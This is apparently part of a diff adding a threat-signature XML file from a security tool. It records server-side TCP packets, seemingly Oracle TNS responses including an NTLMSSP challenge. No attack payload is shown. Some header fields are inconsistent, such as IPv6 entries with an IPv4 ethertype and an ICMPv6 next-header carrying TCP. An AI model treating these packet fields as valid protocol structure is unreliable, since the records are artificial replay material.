+    <Output index="Z" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708FCD" AckNumber="2B7345F2" HeaderLength="05" WindowSize="FF96" Checksum="B7A6" UrgentPointer="0000" Options="" Payload="00160000060000000000080200000009050000000400" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="AB" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708FE3" AckNumber="2B73462F" HeaderLength="05" WindowSize="FF59" Checksum="B690" UrgentPointer="0000" Options="" Payload="00160000060000000000080200000009050000000500" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="AE" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C708FF9" AckNumber="2B734A07" HeaderLength="05" WindowSize="FB81" Checksum="90B9" UrgentPointer="0000" Options="" Payload="02120000060000000000080600AEE41A00000000000100000000000000000000000000000000001300000000000800000008414D45524943414E1000000000000700000007414D45524943410900000000000100000001240000000000000700000007414D455249434101000000000002000000022E2C0200000000000C0000000C5745384D5357494E313235320A00000000000900000009475245474F5249414E0C0000000000090000000944442D4D4F4E2D52520700000000000800000008414D45524943414E080000000000060000000642494E4152590B00000000000E0000000E48482E4D492E535358464620414D390000000000180000001844442D4D4F4E2D52522048482E4D492E535358464620414D3A0000000000120000001248482E4D492E535358464620414D20545A523B00000000001C0000001C44442D4D4F4E2D52522048482E4D492E535358464620414D20545A523C0000000000010000000124340000000000060000000642494E4152593200000000000400000004425954453D0000000000050000000546414C53453E00000000000B0000000B80000000383C3C80000000A30000000000040100000006000101000000000000000000010000002F0000000000000000000000000000000000000000000000000000080000010000003601000000000000E8E12F0A00000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="AG" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C70920B" AckNumber="2B734A23" HeaderLength="05" WindowSize="FB65" Checksum="BD74" UrgentPointer="0000" Options="" Payload="0011000006000000000009010000000800" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="AK" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C70921C" AckNumber="2B734A30" HeaderLength="05" WindowSize="FB58" Checksum="BD6B" UrgentPointer="0000" Options="" Payload="0011000006000000000009010000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="L" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6C7088D3" AckNumber="2B733EE5" HeaderLength="05" WindowSize="FCB4" Checksum="F95C" UrgentPointer="0000" Options="" Payload="00D10000060000000000DEADBEEF00C70A200100000100000100020000000000040001A600000000A600014E544C4D53535000020000001200120038000000058282A2A2FE7C00F7CB1E7A00000000000000005C005C004A000000050093080000000F4F005200410043004C004500310030004700020012004F005200410043004C004500310030004700010012004F005200410043004C004500310030004700040012004F007200610063006C006500310030006700030012004F007200610063006C00650031003000670000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
